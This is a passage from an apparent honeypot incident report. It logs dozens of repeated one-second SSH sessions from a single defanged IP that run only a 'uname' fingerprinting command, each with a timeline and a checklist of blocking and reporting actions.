| `2026-09-27 13:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99cfefd726e5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:52` | `cowrie.session.connect` |
| `2026-09-27 13:04:52` | `cowrie.client.version` |
| `2026-09-27 13:04:52` | `cowrie.client.kex` |
| `2026-09-27 13:04:52` | `cowrie.login.success` |
| `2026-09-27 13:04:53` | `cowrie.session.params` |
| `2026-09-27 13:04:53` | `cowrie.command.input` |
| `2026-09-27 13:04:53` | `cowrie.log.closed` |
| `2026-09-27 13:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164574744125

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:04 |
| **Last Seen** | 2026-09-27 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:04:56` | `cowrie.session.connect` |
| `2026-09-27 13:04:56` | `cowrie.client.version` |
| `2026-09-27 13:04:57` | `cowrie.client.kex` |
| `2026-09-27 13:04:57` | `cowrie.login.success` |
| `2026-09-27 13:04:58` | `cowrie.session.params` |
| `2026-09-27 13:04:58` | `cowrie.command.input` |
| `2026-09-27 13:04:58` | `cowrie.log.closed` |
| `2026-09-27 13:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5aa2c49a485

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:02` | `cowrie.session.connect` |
| `2026-09-27 13:05:02` | `cowrie.client.version` |
| `2026-09-27 13:05:02` | `cowrie.client.kex` |
| `2026-09-27 13:05:02` | `cowrie.login.success` |
| `2026-09-27 13:05:03` | `cowrie.session.params` |
| `2026-09-27 13:05:03` | `cowrie.command.input` |
| `2026-09-27 13:05:03` | `cowrie.log.closed` |
| `2026-09-27 13:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba42d85b3cb6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:07` | `cowrie.session.connect` |
| `2026-09-27 13:05:07` | `cowrie.client.version` |
| `2026-09-27 13:05:07` | `cowrie.client.kex` |
| `2026-09-27 13:05:07` | `cowrie.login.success` |
| `2026-09-27 13:05:08` | `cowrie.session.params` |
| `2026-09-27 13:05:08` | `cowrie.command.input` |
| `2026-09-27 13:05:09` | `cowrie.log.closed` |
| `2026-09-27 13:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19aad20804b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:12` | `cowrie.session.connect` |
| `2026-09-27 13:05:12` | `cowrie.client.version` |
| `2026-09-27 13:05:12` | `cowrie.client.kex` |
| `2026-09-27 13:05:12` | `cowrie.login.success` |
| `2026-09-27 13:05:13` | `cowrie.session.params` |
| `2026-09-27 13:05:13` | `cowrie.command.input` |
| `2026-09-27 13:05:13` | `cowrie.log.closed` |
| `2026-09-27 13:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a4ade8d8df0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:17` | `cowrie.session.connect` |
| `2026-09-27 13:05:17` | `cowrie.client.version` |
| `2026-09-27 13:05:17` | `cowrie.client.kex` |
| `2026-09-27 13:05:18` | `cowrie.login.success` |
| `2026-09-27 13:05:18` | `cowrie.session.params` |
| `2026-09-27 13:05:18` | `cowrie.command.input` |
| `2026-09-27 13:05:19` | `cowrie.log.closed` |
| `2026-09-27 13:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d39173dfcc80

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:22` | `cowrie.session.connect` |
| `2026-09-27 13:05:22` | `cowrie.client.version` |
| `2026-09-27 13:05:23` | `cowrie.client.kex` |
| `2026-09-27 13:05:23` | `cowrie.login.success` |
| `2026-09-27 13:05:24` | `cowrie.session.params` |
| `2026-09-27 13:05:24` | `cowrie.command.input` |
| `2026-09-27 13:05:24` | `cowrie.log.closed` |
| `2026-09-27 13:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c33625bac6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:27` | `cowrie.session.connect` |
| `2026-09-27 13:05:27` | `cowrie.client.version` |
| `2026-09-27 13:05:28` | `cowrie.client.kex` |
| `2026-09-27 13:05:28` | `cowrie.login.success` |
| `2026-09-27 13:05:29` | `cowrie.session.params` |
| `2026-09-27 13:05:29` | `cowrie.command.input` |
| `2026-09-27 13:05:29` | `cowrie.log.closed` |
| `2026-09-27 13:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7992530e2036

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:33` | `cowrie.session.connect` |
| `2026-09-27 13:05:33` | `cowrie.client.version` |
| `2026-09-27 13:05:33` | `cowrie.client.kex` |
| `2026-09-27 13:05:33` | `cowrie.login.success` |
| `2026-09-27 13:05:34` | `cowrie.session.params` |
| `2026-09-27 13:05:34` | `cowrie.command.input` |
| `2026-09-27 13:05:34` | `cowrie.log.closed` |
| `2026-09-27 13:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63ecaaa58686

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:38` | `cowrie.session.connect` |
| `2026-09-27 13:05:38` | `cowrie.client.version` |
| `2026-09-27 13:05:38` | `cowrie.client.kex` |
| `2026-09-27 13:05:38` | `cowrie.login.success` |
| `2026-09-27 13:05:39` | `cowrie.session.params` |
| `2026-09-27 13:05:39` | `cowrie.command.input` |
| `2026-09-27 13:05:39` | `cowrie.log.closed` |
| `2026-09-27 13:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f45b5c07d3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:43` | `cowrie.session.connect` |
| `2026-09-27 13:05:43` | `cowrie.client.version` |
| `2026-09-27 13:05:43` | `cowrie.client.kex` |
| `2026-09-27 13:05:43` | `cowrie.login.success` |
| `2026-09-27 13:05:44` | `cowrie.session.params` |
| `2026-09-27 13:05:44` | `cowrie.command.input` |
| `2026-09-27 13:05:44` | `cowrie.log.closed` |
| `2026-09-27 13:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9b662eb341

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:47` | `cowrie.session.connect` |
| `2026-09-27 13:05:47` | `cowrie.client.version` |
| `2026-09-27 13:05:47` | `cowrie.client.kex` |
| `2026-09-27 13:05:48` | `cowrie.login.success` |
| `2026-09-27 13:05:49` | `cowrie.session.params` |
| `2026-09-27 13:05:49` | `cowrie.command.input` |
| `2026-09-27 13:05:49` | `cowrie.log.closed` |
| `2026-09-27 13:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc2390b33a2

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:53` | `cowrie.session.connect` |
| `2026-09-27 13:05:53` | `cowrie.client.version` |
| `2026-09-27 13:05:53` | `cowrie.client.kex` |
| `2026-09-27 13:05:53` | `cowrie.login.success` |
| `2026-09-27 13:05:54` | `cowrie.session.params` |
| `2026-09-27 13:05:54` | `cowrie.command.input` |
| `2026-09-27 13:05:54` | `cowrie.log.closed` |
| `2026-09-27 13:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aa907961545

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:05 |
| **Last Seen** | 2026-09-27 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:05:57` | `cowrie.session.connect` |
| `2026-09-27 13:05:57` | `cowrie.client.version` |
| `2026-09-27 13:05:57` | `cowrie.client.kex` |
| `2026-09-27 13:05:58` | `cowrie.login.success` |
| `2026-09-27 13:05:59` | `cowrie.session.params` |
| `2026-09-27 13:05:59` | `cowrie.command.input` |
| `2026-09-27 13:05:59` | `cowrie.log.closed` |
| `2026-09-27 13:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed7d63d3a1c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:02` | `cowrie.session.connect` |
| `2026-09-27 13:06:02` | `cowrie.client.version` |
| `2026-09-27 13:06:02` | `cowrie.client.kex` |
| `2026-09-27 13:06:03` | `cowrie.login.success` |
| `2026-09-27 13:06:04` | `cowrie.session.params` |
| `2026-09-27 13:06:04` | `cowrie.command.input` |
| `2026-09-27 13:06:04` | `cowrie.log.closed` |
| `2026-09-27 13:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aad0893c5db

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:08` | `cowrie.session.connect` |
| `2026-09-27 13:06:08` | `cowrie.client.version` |
| `2026-09-27 13:06:08` | `cowrie.client.kex` |
| `2026-09-27 13:06:08` | `cowrie.login.success` |
| `2026-09-27 13:06:09` | `cowrie.session.params` |
| `2026-09-27 13:06:09` | `cowrie.command.input` |
| `2026-09-27 13:06:09` | `cowrie.log.closed` |
| `2026-09-27 13:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516800a44373

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:12` | `cowrie.session.connect` |
| `2026-09-27 13:06:12` | `cowrie.client.version` |
| `2026-09-27 13:06:12` | `cowrie.client.kex` |
| `2026-09-27 13:06:13` | `cowrie.login.success` |
| `2026-09-27 13:06:14` | `cowrie.session.params` |
| `2026-09-27 13:06:14` | `cowrie.command.input` |
| `2026-09-27 13:06:14` | `cowrie.log.closed` |
| `2026-09-27 13:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68760ff0fe80

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:18` | `cowrie.session.connect` |
| `2026-09-27 13:06:18` | `cowrie.client.version` |
| `2026-09-27 13:06:18` | `cowrie.client.kex` |
| `2026-09-27 13:06:18` | `cowrie.login.success` |
| `2026-09-27 13:06:19` | `cowrie.session.params` |
| `2026-09-27 13:06:19` | `cowrie.command.input` |
| `2026-09-27 13:06:19` | `cowrie.log.closed` |
| `2026-09-27 13:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14780df7a778

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:22` | `cowrie.session.connect` |
| `2026-09-27 13:06:22` | `cowrie.client.version` |
| `2026-09-27 13:06:23` | `cowrie.client.kex` |
| `2026-09-27 13:06:23` | `cowrie.login.success` |
| `2026-09-27 13:06:24` | `cowrie.session.params` |
| `2026-09-27 13:06:24` | `cowrie.command.input` |
| `2026-09-27 13:06:24` | `cowrie.log.closed` |
| `2026-09-27 13:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05c1dbc69135

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:27` | `cowrie.session.connect` |
| `2026-09-27 13:06:27` | `cowrie.client.version` |
| `2026-09-27 13:06:27` | `cowrie.client.kex` |
| `2026-09-27 13:06:28` | `cowrie.login.success` |
| `2026-09-27 13:06:29` | `cowrie.session.params` |
| `2026-09-27 13:06:29` | `cowrie.command.input` |
| `2026-09-27 13:06:29` | `cowrie.log.closed` |
| `2026-09-27 13:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542a186fe99c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:32` | `cowrie.session.connect` |
| `2026-09-27 13:06:32` | `cowrie.client.version` |
| `2026-09-27 13:06:33` | `cowrie.client.kex` |
| `2026-09-27 13:06:33` | `cowrie.login.success` |
| `2026-09-27 13:06:34` | `cowrie.session.params` |
| `2026-09-27 13:06:34` | `cowrie.command.input` |
| `2026-09-27 13:06:34` | `cowrie.log.closed` |
| `2026-09-27 13:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4400dc656fda

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:37` | `cowrie.session.connect` |
| `2026-09-27 13:06:37` | `cowrie.client.version` |
| `2026-09-27 13:06:37` | `cowrie.client.kex` |
| `2026-09-27 13:06:38` | `cowrie.login.success` |
| `2026-09-27 13:06:38` | `cowrie.session.params` |
| `2026-09-27 13:06:38` | `cowrie.command.input` |
| `2026-09-27 13:06:39` | `cowrie.log.closed` |
| `2026-09-27 13:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51a7d0041d24

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:42` | `cowrie.session.connect` |
| `2026-09-27 13:06:42` | `cowrie.client.version` |
| `2026-09-27 13:06:42` | `cowrie.client.kex` |
| `2026-09-27 13:06:43` | `cowrie.login.success` |
| `2026-09-27 13:06:44` | `cowrie.session.params` |
| `2026-09-27 13:06:44` | `cowrie.command.input` |
| `2026-09-27 13:06:44` | `cowrie.log.closed` |
| `2026-09-27 13:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd329b37ea6e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:47` | `cowrie.session.connect` |
| `2026-09-27 13:06:47` | `cowrie.client.version` |
| `2026-09-27 13:06:47` | `cowrie.client.kex` |
| `2026-09-27 13:06:48` | `cowrie.login.success` |
| `2026-09-27 13:06:48` | `cowrie.session.params` |
| `2026-09-27 13:06:48` | `cowrie.command.input` |
| `2026-09-27 13:06:48` | `cowrie.log.closed` |
| `2026-09-27 13:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e32cc607549

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:06:52` | `cowrie.session.connect` |
| `2026-09-27 13:06:52` | `cowrie.client.version` |
| `2026-09-27 13:06:52` | `cowrie.client.kex` |
| `2026-09-27 13:06:52` | `cowrie.login.success` |
| `2026-09-27 13:06:53` | `cowrie.session.params` |
| `2026-09-27 13:06:53` | `cowrie.command.input` |
| `2026-09-27 13:06:54` | `cowrie.log.closed` |
| `2026-09-27 13:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70192d317e23

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:06 |
| **Last Seen** | 2026-09-27 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
